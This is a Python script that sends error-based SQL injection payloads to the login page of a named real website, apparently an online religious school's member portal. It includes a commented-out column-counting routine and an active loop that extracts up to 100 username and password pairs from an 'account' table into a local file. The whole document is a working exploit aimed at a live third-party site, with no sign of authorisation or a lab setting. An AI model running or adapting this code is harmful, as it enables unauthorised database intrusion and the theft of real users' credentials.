#!/usr/bin/env python

import requests

# Used curl to python requests https://curl.trillworks.com/

cookies = {
    '__cfduid': 'd828ca59b283927820e0440ab64e920b51608532554',
    'PHPSESSID': '01af0pg6osit83hh0q1q1dcpe1',
}

headers = {
    'Host': 'www.onlinemadrasa.org',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '33',
}
'''
def columns_count():
        payload = "admin' and extractvalue(0x0a,concat(0x0a,(select count(column_name) from information_schema.columns where table_schema=database())))-- -"
        data = 'username='+ payload +'&pass=admin&submit='
        response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
        html = response.text.splitlines()
        columns = html[1][:-1]
        print('[+] Total Columns: ' + columns)
        global col_count
        col_count = int(columns)+1
columns_count()
'''
def tables_columns_names():
    try:
        file = open('user_pass.txt','w')
        for num in range(100):
            payload = "admin' OR 1 GROUP BY CONCAT_WS(0x3a,(select concat(username,':',userpass) from account limit "+str(num)+",1),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1-- -"
            data = 'username='+ payload +'&pass=admin&submit='
            response = requests.post('https://www.onlinemadrasa.org/members/accounts/index.php', headers=headers, cookies=cookies, data=data, verify=True)
            html = response.text[17:-23]
            print(html)
            file.write(html + '\n')
    except:
        print('[+] Done!')
tables_columns_names()

